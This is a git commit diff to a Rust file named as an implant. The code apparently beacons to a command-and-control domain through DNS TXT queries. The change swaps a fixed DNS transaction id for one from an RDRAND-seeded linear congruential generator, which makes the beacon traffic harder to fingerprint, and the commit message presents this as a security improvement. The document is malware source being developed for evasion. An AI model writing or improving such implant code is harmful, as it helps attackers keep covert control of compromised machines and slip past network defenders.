433bbd3cb83f711af18c2d3aa3d7ca4f3a250a49
a-rvid <git@rvid.eu>
2026-04-08 20:20:01 +0200

    Linear congruential generator (LCG) PRNG for tx_id, improves security

--- implant/src/main.rs
+++ implant/src/main.rs
@@ -20,6 +20,22 @@ use simple_dns::rdata::RData;
 
 const C2_DOMAIN: &str = env!("C2_DOMAIN");
 
+struct Lcg {
+    seed: u32,
+    multiplier: u32, // a
+    increment: u32, // c
+}
+
+impl Lcg {
+    fn new(seed: u32, multiplier: u32, increment: u32) -> Self {
+        Self { seed, multiplier, increment }
+    }
+    fn next_u16(&mut self) -> u16 {
+        self.seed = self.seed.wrapping_mul(self.multiplier).wrapping_add(self.increment);
+        (self.seed >> 16) as u16
+    }
+}
+
 const fn parse_u8(s: &str) -> u8 {
     let b = s.as_bytes();
     let mut i = 0;
@@ -53,8 +69,8 @@ impl Resolver {
         Self { server }
     }
 
-    pub fn query_txt(&self, name: &str) -> Option<Vec<Vec<u8>>> {
-        let mut packet = Packet::new_query(0xF1AC);
+    pub fn query_txt(&self, name: &str, tx_id: u16) -> Option<Vec<Vec<u8>>> {
+        let mut packet = Packet::new_query(tx_id);
         packet.set_flags(PacketFlag::RECURSION_DESIRED);
         packet.questions.push(
             Question::new(
@@ -67,6 +83,10 @@ impl Resolver {
         let query_bytes = packet.build_bytes_vec().ok()?;
 
         let mut resp_buf = [0u8; 4096];
+        
+        #[cfg(debug_assertions)]
+        println!("Sending query with id {}", tx_id);
+
         let rlen = socket::udp_query(
             self.server,
             53,
@@ -100,11 +120,15 @@ impl Resolver {
 
 #[unsafe(no_mangle)]
 extern "C" fn main() -> i32 {
+    let mut seed: u32 = 0;
+    unsafe { core::arch::x86_64::_rdrand32_step(&mut seed) };
+    let mut lcg = Lcg::new(seed, 1664525, 1013904223); // https://en.wikipedia.org/wiki/Linear_congruential_generator
+
     let resolver = Resolver::new(DNS_SERVER);
-    if let Some(txt_records) = resolver.query_txt(C2_DOMAIN) {
+    if let Some(txt_records) = resolver.query_txt(C2_DOMAIN, lcg.next_u16()) {
         for txt in &txt_records {
             match core::str::from_utf8(txt) {
-                Ok(s)  => { #[cfg(debug_assertions)] println!("{}", s); },
+                Ok(s)  => { #[cfg(debug_assertions)] println!("Recieved: {}", s); },
                 Err(_) => { #[cfg(debug_assertions)] println!("(invalid utf8)"); },
             }
         }
